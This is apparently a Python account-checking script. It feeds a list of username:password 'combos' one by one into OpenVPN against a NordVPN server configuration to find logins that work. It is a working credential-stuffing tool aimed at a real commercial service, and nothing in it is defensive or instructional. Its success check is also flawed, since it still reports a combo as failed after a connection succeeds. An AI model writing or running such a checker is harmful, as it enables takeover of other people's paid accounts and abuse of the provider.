import logging
import subprocess
import threading
import time

DEBUG = False
INFO = True
log = logging.getLogger('Connector-Logger')  # Creating logger
if DEBUG:
    log.setLevel(logging.DEBUG)  # Setting logging level to DEBUG
if INFO:
    log.setLevel(logging.INFO)  # Setting logging level to INFO (default)
log.addHandler(logging.StreamHandler())  # Adding StreamHandler


class Connector:
    def __init__(self, ovpn_path: str, config_path: str, combos: str, timeout: int):
        self.ovpn_path = ovpn_path
        self.config_path = config_path
        self.combos = combos
        self.timeout = timeout
        log.debug('Loaded with configuration:')
        log.debug(f'OpenVPN path: {self.ovpn_path}')
        log.debug(f'.ovpn config path: {self.config_path}')
        log.debug(f'Combos path: {self.combos}')
        log.debug(f'Timeout: {self.timeout}s')

    def unpack(self):
        with open(self.combos, 'r') as combos:
            self.combolist = combos.readlines()

    def connect(self):
        for combo in self.combolist:
            log.info(f'Trying {combo.strip()}...')
            with open('ovpn/auth.txt', 'w') as auth:
                auth.write(combo.strip().replace(':', '\n', 1))
            ovpn = subprocess.Popen([self.ovpn_path, '--config', self.config_path, '--auth-user-pass', 'ovpn/auth.txt'],
                                    stdout=subprocess.PIPE)

            def read_output():
                while ovpn.poll() is None:
                    log.debug(ovpn.stdout.readline())
                return
            thread = threading.Thread(target=read_output)
            thread.start()

            time.sleep(self.timeout)
            if ovpn.poll() is None:
                log.info('Connected successfully, OpenVPN output: \n\n' + ovpn.stdout.read(1024).decode())

            log.info(f'Combo {combo.strip()} didn\'t work.')
        log.info('No working combo found.')


if __name__ == '__main__':
    cn = Connector(ovpn_path='ovpn/openvpn.exe', config_path='ovpn/ch275.nordvpn.com.udp.ovpn', combos='output/out.txt',
                   timeout=30)
    cn.unpack()
    cn.connect()
